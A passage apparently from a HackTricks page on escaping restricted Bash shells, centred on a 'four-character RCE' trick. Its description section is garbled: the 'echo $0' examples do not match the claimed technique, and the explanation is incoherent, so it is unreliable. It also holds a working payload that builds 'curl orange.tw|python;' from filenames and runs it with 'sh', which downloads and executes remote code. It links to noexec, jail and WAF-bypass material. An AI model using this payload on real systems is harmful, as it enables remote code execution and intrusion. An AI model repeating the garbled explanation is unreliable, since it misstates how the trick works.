## If there is a file /flag.txt that will create a hard link
## to it in the current folder
```
### RCE with 4 chars

### 4 chars RCE

#### Description:

This technique allows you to execute arbitrary commands on a target system by bypassing Bash restrictions. It is based on the fact that Bash allows command substitution within double quotes.

#### Exploitation:

To exploit this technique, you need to find a way to execute a command with only 4 characters. Here is an example:

```bash
$ echo $0
bash
```

In this example, the command `echo $0` is executed, which prints the name of the current shell (`bash`). Now, let's use command substitution to execute a different command:

```bash
$ echo $(echo $0)
bash
```

By enclosing the command `echo $0` within `$(...)`, we are able to execute it as a subcommand. This allows us to execute arbitrary commands within the subcommand.

#### Limitations:

- This technique relies on the target system having Bash as the default shell.
- The command to be executed must be able to fit within the 4-character limit.

#### Mitigation:

To mitigate this technique, you can:

- Use a restricted shell that does not allow command substitution.
- Regularly update and patch your system to ensure that any vulnerabilities are addressed.
- Implement strong access controls to prevent unauthorized access to your system.
```bash
# In a similar fashion to the previous bypass this one just need 4 chars to execute commands
# it will follow the same principle of creating the command `ls -t>g` in a file
# and then generate the full command in filenames
# generate "g> ht- sl" to file "v"
'>dir'
'>sl'
'>g\>'
'>ht-'
'*>v'

# reverse file "v" to file "x", content "ls -th >g"
'>rev'
'*v>x'

# generate "curl orange.tw|python;"
'>\;\\'
'>on\\'
'>th\\'
'>py\\'
'>\|\\'
'>tw\\'
'>e.\\'
'>ng\\'
'>ra\\'
'>o\\'
'>\ \\'
'>rl\\'
'>cu\\'

# got shell
'sh x'
'sh g'
```
## Read-Only/Noexec/Distroless Bypass

If you are inside a filesystem with the **read-only and noexec protections** or even in a distroless container, there are still ways to **execute arbitrary binaries, even a shell!:**

{% content-ref url="../bypass-bash-restrictions/bypass-fs-protections-read-only-no-exec-distroless/" %}
[bypass-fs-protections-read-only-no-exec-distroless](../bypass-bash-restrictions/bypass-fs-protections-read-only-no-exec-distroless/)
{% endcontent-ref %}

## Chroot & other Jails Bypass

{% content-ref url="../privilege-escalation/escaping-from-limited-bash.md" %}
[escaping-from-limited-bash.md](../privilege-escalation/escaping-from-limited-bash.md)
{% endcontent-ref %}

## References & More

* [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection#exploits](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection#exploits)
* [https://github.com/Bo0oM/WAF-bypass-Cheat-Sheet](https://github.com/Bo0oM/WAF-bypass-Cheat-Sheet)
* [https://medium.com/secjuice/web-application-firewall-waf-evasion-techniques-2-125995f3e7b0](https://medium.com/secjuice/web-application-firewall-waf-evasion-techniques-2-125995f3e7b0)
* [https://www.secjuice.com/web-application-firewall-waf-evasion/](https://www.secjuice.com/web-application-firewall-waf-evasion/)

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Use [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) to easily build and **automate workflows** powered by the world's **most advanced** community tools.\
Get Access Today:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><strong>Learn AWS hacking from zero to hero with</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Other ways to support HackTricks:

* If you want to see your **company advertised in HackTricks** or **download HackTricks in PDF** Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Share your hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
